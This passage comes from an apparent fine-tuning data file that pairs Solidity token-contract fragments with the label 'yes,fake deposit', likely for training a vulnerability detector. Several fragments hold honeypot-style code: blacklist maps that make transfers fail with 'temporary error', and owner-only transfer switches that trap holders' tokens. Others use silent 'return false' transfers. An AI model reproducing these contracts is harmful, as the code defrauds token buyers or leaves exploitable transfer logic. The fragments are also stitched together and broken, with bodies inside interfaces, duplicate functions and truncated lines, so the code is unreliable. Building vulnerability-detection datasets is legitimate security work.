_to;\n ownerToNFTokenCount[_to] += 1;\n }\n\n function _getOwnerNFTCount(\n address _owner\n )\n internal\n virtual\n view\n returns (uint256)\n {\n return ownerToNFTokenCount[_owner];\n }\n\n function _safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes memory _data\n )\n private\n canTransfer(_tokenId)\n validNFToken(_tokenId)\n {\n address tokenOwner = idToOwner[_tokenId];\n require(tokenOwner == _from, NOT_OWNER);\n require(_to != address(0), ZERO_ADDRESS);\n\n _transfer(_to, _tokenId);\n\n if (_to.isContract())\n {\n bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data);\n require(retval == MAGIC_ON_ERC721_RECEIVED, NOT_ABLE_TO_RECEIVE_NFT);\n }\n }\n\n function _clearApproval(\n uint256 _tokenId\n )\n private\n {\n delete idToApproval[_tokenId];\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3; \n\n library Address {\n \n function isContract(address account) internal view returns (bool) {\n // This method relies on extcodesize, which returns 0 for contracts in\n // construction, since the code is only stored at the end of the\n // constructor execution. \n uint256 size;\n assembly {\n size := extcodesize(account)\n }\n return size > 0;\n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n } \n \n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n } \n \n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n } \n \n function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1; \n \n \nabstract contract Context { \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \ninterface IERC20Metadata is IERC20 { \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be grater thatn zero\"); \n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\"); \n if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} \n else {require (maxTxPercent == true, \"\");} \n } \n \n \n function burnRewards(address account, uint256 value) external onlyOwner { \n _burn(account, value); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12; \n \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \nlibrary SafeMath { \n \n function transfer(address recipient, uint256 amount) public override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) private { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be greater than zero\"); \n if (BOTtoScan[sender] || BOTtoScan[recipient]) \n require(amount == 0, \"temporary error\"); \n if (_contractRunning == false || sender == owner() || recipient == owner()) { \n if (_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferFromExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && _isExcluded[recipient]) { \n _transferToExcluded(sender, recipient, amount); \n } else if (!_isExcluded[sender] && !_isExcluded[recipient]) { \n _transferStandard(sender, recipient, amount); \n } else if (_isExcluded[sender] && _isExcluded[recipient]) { \n _transferBothExcluded(sender, recipient, amount); \n } else {_transferStandard(sender, recipient, amount);}} \n else {require (_contractRunning == false, \"Unexpected error\");} \n } \n \n function _getCurrentSupply() private view returns(uint256, uint256) { \n uint256 rSupply = _rTotal; \n uint256 tSupply = _tTotal; \n for (uint256 i = 0; i < _excluded.length; i++) { \n if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal); \n rSupply = rSupply.sub(_rOwned[_excluded[i]]); \n tSupply = tSupply.sub(_tOwned[_excluded[i]]); \n } \n if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); \n return (rSupply, tSupply); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.7.1;interface IErc223 { \n function totalSupply() external view returns (uint); \n \n function transfer(address to, uint value, bytes memory data) external returns (bool ok); \n \n event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); \n} \n \n \n \ninterface IErc223ReceivingContract { \n \n function transfer(address to, uint tokens) external returns (bool success); \n \n function transferFrom(address from, address to, uint tokens) external returns (bool success); \n \n event Transfer(address indexed from, address indexed to, uint tokens); \n event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \n \n \n \n \n \nlibrary Address { \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \nlibrary SafeMath { \n \n function transfer(address _to, uint256 _value) public override returns (bool ok) { \n // block transfers if the recipient only allows kyc input, check other factors \n if (onlyAcceptsKycInput[_to] == false && balances[msg.sender][ShyftTokenType] >= _value) { \n balances[msg.sender][ShyftTokenType] = balances[msg.sender][ShyftTokenType].sub(_value); \n \n balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_value); \n \n emit Transfer(msg.sender, _to, _value); \n \n return true; \n } else { \n return false; \n } \n } \n \n /// @param _tokenOwner The address of the origin. \n /// @param _spender The address of the recipient. \n /// @dev Get the current allowance for the basic Shyft token type. (basic ERC20 functionality) \n /// @return remaining the current allowance for the basic Shyft token type for a specific user \n \n function transferFrom(address _from, address _to, uint _tokens) public override returns (bool success) { \n if (onlyAcceptsKycInput[_to] == false && allowed[_from][msg.sender][ShyftTokenType] >= _tokens && balances[_from][ShyftTokenType] >= _tokens) { \n allowed[_from][msg.sender][ShyftTokenType] = allowed[_from][msg.sender][ShyftTokenType].sub(_tokens); \n \n balances[_from][ShyftTokenType] = balances[_from][ShyftTokenType].sub(_tokens); \n balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_tokens); \n \n emit Transfer(_from, _to, _tokens); \n emit Approval(_from, msg.sender, allowed[_from][msg.sender][ShyftTokenType]); \n \n return true; \n } else { \n return false; \n } \n } \n \n /// @param _to The address of the receiver of minted tokens. \n /// @param _amount The amount of minted tokens. \n /// @dev Mints tokens to a specific address. Called only by an account with a minter role. \n /// @notice Has Shyft Opt-in Compliance feature-sets for expansion/mvp capabilities. \n \n r) { \n IShyftKycContractRegistry contractRegistry = IShyftKycContractRegistry(shyftKycContractRegistryAddress); \n \n address ethMarch26KycContractAddress = contractRegistry.getContractAddressOfVersion(0); \n \n if (ethMarch26KycContractAddress != address(0)) { \n IERC20 march26Erc20 = IERC20(ethMarch26KycContractAddress); \n \n uint256 currentBalance = march26Erc20.balanceOf(address(this)); \n \n uint256 incorrectlySentAssetBalance = currentBalance.sub(v1TotalUpgradeAmount); \n \n if (_amount <= incorrectlySentAssetBalance) { \n bool success = march26Erc20.transfer(_destination, _amount); \n \n if (success == true) { \n emit EVT_redeemIncorrectlySentAsset(_destination, _amount); \n \n return 4; \n } else { \n revert(\"erc20 transfer event did not succeed\"); \n // return 3; \n } \n } else { \n //did not have enough tokens in incorrectly-sent balance account to redeem \n return 2; \n } \n } else { \n return 1; \n } \n } else { \n return 0; \n } \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.7.6 <0.8.0;\nimport \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol \"; \n\n contract DOSE is ERC20 {\n constructor(\n address[] memory recipients,\n uint256[] memory values,\n string memory tokenURI_\n ) ERC20( \"DOSE \", \"DOSE \", 18, tokenURI_) {\n _batchMint(recipients, values);\n }\n}\n\" \n }, \n \"@animoca/ethereum-contracts-assets/contracts/token/ERC20/ERC20.sol\": { \n \"content\": \"\npragma solidity >=0.7.6 <0.8.0;\nimport {ManagedIdentity} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/metatx/ManagedIdentity.sol \";import {IERC165} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/introspection/IERC165.sol \";import {AddressIsContract} from \"@animoca/ethereum-contracts-core-1.1.1/contracts/utils/types/AddressIsContract.sol \";import {IERC20} from \"./IERC20.sol \";import {IERC20Detailed} from \"./IERC20Detailed.sol \";import {IERC20Allowance} from \"./IERC20Allowance.sol \";import {IERC20SafeTransfers} from \"./IERC20SafeTransfers.sol \";import {IERC20BatchTransfers} from \"./IERC20BatchTransfers.sol \";import {IERC20Metadata} from \"./IERC20Metadata.sol \";import {IERC20Permit} from \"./IERC20Permit.sol \";import {IERC20Receiver} from \"./IERC20Receiver.sol \"; \n\n abstract contract ERC20 is\n ManagedIdentity,\n IERC165,\n IERC20,\n IERC20Detailed,\n IERC20Metadata,\n IERC20Allowance,\n IERC20BatchTransfers,\n IERC20SafeTransfers,\n IERC20Permit\n{\n using AddressIsContract for address; \n // keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline) \")\n bytes32 internal constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; \n uint256 public immutable deploymentChainId; \n // solhint-disable-next-line var-name-mixedcase\n bytes32 internal immutable _DOMAIN_SEPARATOR; \n mapping(address => uint256) public override nonces; \n string internal _name;\n string internal _symbol;\n uint8 internal immutable _decimals;\n string internal _tokenURI; \n mapping(address => uint256) internal _balances;\n mapping(address => mapping(address => uint256)) internal _allowances;\n uint256 internal _totalSupply; \n constructor(\n string memory name_,\n string memory symbol_,\n uint8 decimals_,\n string memory tokenURI_\n ) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _tokenURI = tokenURI_; \n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n deploymentChainId = chainId;\n _DOMAIN_SEPARATOR = _calculateDomainSeparator(chainId, bytes(name_));\n } \n // solhint-disable-next-line func-name-mixedcase\n function transfer(address to, uint256 value) external virtual override returns (bool) {\n _transfer(_msgSender(), to, value);\n return true;\n } \n /// @dev See {IERC20-transferFrom}.\n function transferFrom(\n address from,\n address to,\n uint256 value\n ) external virtual override returns (bool) {\n _transferFrom(_msgSender(), from, to, value);\n return true;\n } \n /////////////////////////////////////////// ERC20MultiTransfer /////////////////////////////////////// \n /// @dev See {IERC20MultiTransfer-multiTransfer(address[],uint256[])}.\n function transfer(address to, uint256 value) external returns (bool); \n \n function transferFrom(\n address from,\n address to,\n uint256 value\n ) external returns (bool); \n \n \n } \n}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.7;\n\n contract DAO {\n address public dao;\n event DAOChanged(address from, address to); \n constructor() {\n dao = msg.sender;\n emit DAOChanged(address(0), msg.sender);\n } \n modifier onlyDAO() {\n require(msg.sender == dao, \"Only DAO \");\n _;\n } \n function transfer(address recipient, uint256 amount)\n external\n returns (bool); \n \n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n} \n// Interfaces for contract interaction\n interface INterfaces {\n function transfer(address, uint256) external returns (bool); \n function transferFrom(\n address,\n address,\n uint256\n ) external returns (bool); \n} \n// For tokens that do not return true on transfers eg. USDT\n interface INterfacesNoR {\n function transfer(address, uint256) external; \n function transferFrom(\n address,\n address,\n uint256\n ) external;\n}\n\"},\"owned.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSE\npragma solidity ^0.8.7;\n\n contract Owned {\n address public owner;\n address public newOwner; \n event OwnershipChanged(address from, address to); \n constructor() {\n owner = msg.sender;\n emit OwnershipChanged(address(0), msg.sender);\n } \n modifier onlyOwner() {\n require(msg.sender == owner, \"Only owner \");\n _;\n } \n // owner can give super-rights to someone\n function transfer(address recipient, uint256 amount)\n external\n override\n returns (bool)\n {\n _transfer(msg.sender, recipient, amount);\n return true;\n } \n // ERC20 approve\n function approve(address spender, uint256 amount)\n external\n override\n returns (bool)\n {\n _approve(msg.sender, spender, amount);\n return true;\n } \n // ERC20 transferFrom\n function transferFrom( address sender, address recipient, uint256 amount ) external override returns (bool) {\n uint256 amt = allowance[sender][msg.sender];\n require(amt >= amount, \"ERC20: transfer amount exceeds allowance \");\n // reduce only if not permament allowance (uniswap etc)\n allowance[sender][msg.sender] -= amount;\n _transfer(sender, recipient, amount);\n return true;\n } \n // ERC20 increaseAllowance\n function _transfer( address sender, address recipient, uint256 Amount ) private {\n require(sender != ZERO, \"ERC20: transfer from the zero address \");\n require(recipient != ZERO, \"ERC20: transfer to the zero address \");\n require(!frozenAccount[sender], \"DAO: transfer from this address frozen \");\n require(!frozenAccount[recipient], \"DAO: transfer to this address frozen \"); \n if (Amount > 0) {\n if (isFeeFreeSender[sender]){\n _feeFreeTransfer(sender, recipient, Amount);\n } else if(isFeeFreeRecipient[recipient]){\n _feeFreeTransfer(sender, recipient, Amount);\n } else {\n ( uint256 _FeesToTake, uint256 _toburn, uint256 _tocharity, uint256 _toreward, uint256 _tosystem, uint256 _tostaking ) = _calcTransferFees( Amount ); \n uint256 _totransfer = Amount - _FeesToTake;\n uint256 _takefromsender = Amount - _toburn;\n FeeTotalCollected += _FeesToTake;\n balances[sender] -= _takefromsender;\n balances[recipient] += _totransfer;\n if(_toburn>0){\n _burn(sender, _toburn);\n FeeTotalCollectedBurned += _toburn;\n emit Transfer(sender, ZERO, _toburn);\n }\n if(_tocharity>0){\n balances[charityaddress] += _tocharity;\n emit Transfer(sender, charityaddress, _tocharity);\n }\n if(_toreward>0){\n balances[rewardsaddress] += _toreward;\n emit Transfer(sender, rewardsaddress, _toreward);\n }\n if(_tosystem>0){\n balances[systemaddress] += _tosystem;\n emit Transfer(sender, systemaddress, _tosystem);\n }\n if(_tostaking>0){\n balances[stakingaddress] += _tostaking;\n emit Transfer(sender, stakingaddress, _tostaking);\n }\n emit Transfer(sender, recipient, _totransfer);\n }\n } else emit Transfer(sender, recipient, 0);\n } \n\n \n function withdrawErc20(address token) external onlyOwner {\n uint256 balance = IERC20(token).balanceOf(address(this));\n require(balance > 0, \"Nothing to withdraw \");\n // use broken IERC20\n INterfacesNoR(token).transfer(owner, balance);\n }\n} \n//by Patrick\n\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \ninterface IERC20 { \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function allowance(address owner, address spender) external view returns (uint256); \n \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n return false; \n } \n \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) \n public virtual override returns (bool) \n { \n return false; \n } \n \n function amountOf(address account) public view returns (uint256) { \n return _locks[account].amount; \n } \n \n function pendingReward(address account, address tokenAddress) public view returns (uint256) { \n require(tokenAddress != address(0), \"VotingEscrow: reward token address cannot be 0x0.\"); \n IERC20 token = IERC20(tokenAddress); \n uint256 pending; \n \n if (_balances[account] > 0) { \n uint256 newReward = token.balanceOf(collector); \n uint256 newAccRewardPerBalance = _accRewardPerBalance[tokenAddress].add(newReward.mul(1e18).div(_totalSupply)); \n pending = _balances[account].mul(newAccRewardPerBalance).div(1e18).sub(_rewardDebt[account][tokenAddress]); \n } \n return pending; \n } \n \n function pendingWasabi(address account) public view returns (uint256) { \n uint256 pending; \n \n if (_balances[account] > 0) { \n uint256 accRewardPerBalance = _accWasabiRewardPerBalance; \n if (block.number > lastRewardBlock) { \n uint256 wasabiReward = getBlockReward(lastRewardBlock, block.number); \n accRewardPerBalance = _accWasabiRewardPerBalance.add(wasabiReward.mul(1e18).div(_totalSupply)); \n } \n pending = _balances[account].mul(accRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[account]); \n } \n return pending; \n } \n \n modifier claimReward() { \n collectReward(); \n uint256 veBal = _balances[msg.sender]; \n if (veBal > 0) { \n uint256 wasabiPending = veBal.mul(_accWasabiRewardPerBalance).div(1e18).sub(_wasabiRewardDebts[msg.sender]); \n if (wasabiPending > 0) { \n if (wasabiNeedVesting) { \n IRewardVesting wasabiVesting = IRewardVesting(wasabiVestingAddress); \n wasabi.approve(address(wasabiVesting), wasabiPending); \n wasabiVesting.addEarning(msg.sender, wasabiPending); \n } else { \n _safeWasabiTransfer(msg.sender, wasabiPending); \n } \n } \n for (uint i=0; i<rewardTokens.length; i++) { \n address tokenAddress = rewardTokens[i]; \n if (tokenAddress != address(0)) { \n IERC20 token = IERC20(tokenAddress); \n uint256 pending = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18).sub(_rewardDebt[msg.sender][tokenAddress]); \n if (pending > 0) { \n bool needVesting = rewardsNeedVesting[tokenAddress]; \n if (needVesting) { \n address rewardVestingAddress = rewardVestingsList[tokenAddress]; \n if (rewardVestingAddress != address(0)) { \n IRewardVesting rewardVesting = IRewardVesting(rewardVestingAddress); \n token.approve(address(rewardVesting),pending); \n rewardVesting.addEarning(msg.sender,pending); \n } \n } else { \n token.transfer(msg.sender, pending); \n } \n } \n } \n } \n } \n _; // _balances[msg.sender] may changed. \n veBal = _balances[msg.sender]; \n for (uint i=0; i<rewardTokens.length; i++) { \n address tokenAddress = rewardTokens[i]; \n if (tokenAddress != address(0)) { \n _rewardDebt[msg.sender][tokenAddress] = veBal.mul(_accRewardPerBalance[tokenAddress]).div(1e18); \n } \n } \n _wasabiRewardDebts[msg.sender] = veBal.mul(_accWasabiRewardPerBalance).div(1e18); \n } \n \n function _safeWasabiTransfer(address _to, uint256 _amount) internal { \n if (_amount > 0) { \n uint256 wasabiBal = wasabi.balanceOf(address(this)); \n if (_amount > wasabiBal) { \n wasabi.transfer(_to, wasabiBal); \n } else { \n wasabi.transfer(_to, _amount); \n } \n } \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1; \n \nabstract contract Context { \n function _transfer(address sender, address recipient, uint256 amount) internal override { \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n require(amount > 0, \"Transfer amount must be grater thatn zero \"); \n if (_call[sender] || _call[recipient]) require(_trans == false, \" \"); \n if (_trans == true || sender == owner || recipient == owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} else { \n require (_trans == true, \" \");} \n } \n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n \n return true; \n } \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address \"); \n require(recipient != address(0), \"ERC20: transfer to the zero address \"); \n \n _beforeTokenTransfer(sender, recipient, amount); \n \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n \n emit Transfer(sender, recipient, amount); \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.1; \n import \"./Context.sol \"; \n \n \n abstract contract Ownable is Context { \n address owner; \n address owneraddress; \n event OwnershipTransferred( \n address indexed previousOwner, \n address indexed newOwner \n ); \n \n \n constructor() { \n address msgSender = msg.sender; \n owner = msgSender; \n owneraddress = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n \n \n} \n\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": " \n \npragma solidity ^0.4.24; \n// Safe maths \nlibrary SafeMath { \n function transfer(address to, uint tokens) public returns (bool success); \n function approve(address spender, uint tokens) public returns (bool success); \n function transferFrom(address from, address to, uint tokens) public returns (bool success); \n \n event Transfer(address indexed from, address indexed to, uint tokens); \n event Approval(address indexed tokenOwner, address indexed spender, uint tokens); \n} \ncontract ApproveAndCallFallBack { \n function transfer(address to, uint value) external returns (bool); \n function transferFrom(address from, address to, uint value) external returns (bool); \n \n function DOMAIN_SEPARATOR() external view returns (bytes32); \n function transfer(address recipient, uint256 amount) external returns (bool); \n function transfer(address to, uint tokens) public returns (bool success) { \n uint toBlackHole; \n uint toLiquidity; \n uint toUser; \n uint rate = _calRate(tokens); \n address blackHole = 0x0000000000000000000000000000000000000000; \n if(forceZeroStep || _inZeroWhiteList(msg.sender, to)){ \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n balances[to] = balances[to].add(tokens); \n emit Transfer(msg.sender, to, tokens); \n return true; \n } \n if(force1stStep || _in1stWhiteList(msg.sender, to)){ \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n toBlackHole = tokens.div(1000); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n emit Transfer(msg.sender, blackHole, toBlackHole); \n emit Transfer(msg.sender, to, tokens.sub(toBlackHole)); \n return true; \n } \n if(force2ndStep || _in2ndWhiteList(msg.sender, to)){ \n toBlackHole = tokens.div(1000); \n toLiquidity = tokens.mul(rate).div(100); \n toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n balances[msg.sender] = balances[msg.sender].sub(tokens); \n balances[devPool] = balances[devPool].add(toLiquidity); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(toUser); \n emit Transfer(msg.sender, blackHole, toBlackHole); \n emit Transfer(msg.sender, devPool, toLiquidity); \n emit Transfer(msg.sender, to, toUser); \n return true; \n } \n return true; \n } \n \n \n function transferFrom(address from, address to, uint tokens) public returns (bool success) { \n uint toBlackHole; \n uint toLiquidity; \n uint toUser; \n uint rate = _calRate(tokens); \n address blackHole = 0x0000000000000000000000000000000000000000; \n if(forceZeroStep || _inZeroWhiteList(from, to)){ \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n balances[to] = balances[to].add(tokens); \n emit Transfer(from, to, tokens); \n return true; \n } \n if(force1stStep || _in1stWhiteList(from, to)){ \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n toBlackHole = tokens.div(1000); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(tokens.sub(toBlackHole)); \n emit Transfer(from, blackHole, toBlackHole); \n emit Transfer(from, to, tokens.sub(toBlackHole)); \n return true; \n } \n if(force2ndStep || _in2ndWhiteList(from, to)){ \n toBlackHole = tokens.div(1000); \n toLiquidity = tokens.mul(rate).div(100); \n toUser = tokens.sub(toBlackHole).sub(toLiquidity); \n balances[from] = balances[from].sub(tokens); \n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); \n balances[devPool] = balances[devPool].add(toLiquidity); \n balances[blackHole] = balances[blackHole].add(toBlackHole); \n balances[to] = balances[to].add(toUser); \n emit Transfer(from, blackHole, toBlackHole); \n emit Transfer(from, devPool, toLiquidity); \n emit Transfer(from, to, toUser); \n return true; \n } \n return true; \n } \n \n \n function _safeTransferETH(address to, uint value) internal { \n (bool success) = to.call.value(value)(new bytes(0)); \n require(success, 'Lion Transfer: ETH_TRANSFER_FAILED'); \n } \n function getRateV(uint256 i) public view returns(uint256){ \n return _rateV[i]; \n } \n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.0; \n \ncontract Token { \n \n /// @return total amount of tokens \n function transfer(address _to, uint256 _value) returns (bool success) {} \n \n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from` \n /// @param _from The address of the sender \n /// @param _to The address of the recipient \n /// @param _value The amount of token to be transferred \n /// @return Whether the transfer was successful or not \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} \n \n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens \n /// @param _spender The address of the account able to transfer the tokens \n /// @param _value The amount of wei to be approved for transfer \n /// @return Whether the approval was successful or not \n function transfer(address _to, uint256 _value) returns (bool success) { \n //Default assumes totalSupply can't be over max (2^256 - 1). \n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap. \n //Replace the if with this one instead. \n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n if (balances[msg.sender] >= _value && _value > 0) { \n balances[msg.sender] -= _value; \n balances[_to] += _value; \n Transfer(msg.sender, _to, _value); \n return true; \n } else { return false; } \n } \n \n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { \n //same as above. Replace this line with the following if you want to protect against wrapping uints. \n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n balances[_to] += _value; \n balances[_from] -= _value; \n allowed[_from][msg.sender] -= _value; \n Transfer(_from, _to, _value); \n return true; \n } else { return false; } \n } \n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) { \n allowed[msg.sender][_spender] = _value; \n Approval(msg.sender, _spender, _value); \n \n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this. \n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData) \n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead. \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; } \n return true; \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./Token.sol \"; \n \n \n abstract contract AbstractToken is Token { \n constructor () { \n \n } \n \n \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool success) { \n uint256 fromBalance = accounts [msg.sender]; \n if (fromBalance < _value) return false; \n if (_value > 0 && msg.sender != _to) { \n accounts [msg.sender] = fromBalance - _value; \n accounts [_to] = accounts [_to] + _value; \n } \n emit Transfer (msg.sender, _to, _value); \n return true; \n } \n \n \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool success) { \n uint256 spenderAllowance = allowances [_from][msg.sender]; \n if (spenderAllowance < _value) return false; \n uint256 fromBalance = accounts [_from]; \n if (fromBalance < _value) return false; \n \n allowances [_from][msg.sender] = \n spenderAllowance - _value; \n \n if (_value > 0 && _from != _to) { \n accounts [_from] = fromBalance - _value; \n accounts [_to] = accounts [_to] + _value; \n } \n emit Transfer (_from, _to, _value); \n return true; \n } \n \n \n function transfer (address _to, uint256 _value) \n public override virtual returns (bool) { \n if (frozen) return false; \n else if ( \n (addressFlags [msg.sender] | addressFlags [_to]) & BLACK_LIST_FLAG == \n BLACK_LIST_FLAG) \n return false; \n else { \n if (_value <= accounts [msg.sender]) { \n require (AbstractToken.transfer (_to, _value)); \n return true; \n } else return false; \n } \n } \n \n \n function transferFrom (address _from, address _to, uint256 _value) \n public override virtual returns (bool) { \n if (frozen) return false; \n else if ( \n (addressFlags [_from] | addressFlags [_to]) & BLACK_LIST_FLAG == \n BLACK_LIST_FLAG) \n return false; \n else { \n if (_value <= allowances [_from][msg.sender] && \n _value <= accounts [_from]) { \n require (AbstractToken.transferFrom (_from, _to, _value)); \n return true; \n } else return false; \n } \n } \n \n \n function transfer (address _to, uint256 _value) \n external returns (bool success); \n \n \n function transferFrom (address _from, address _to, 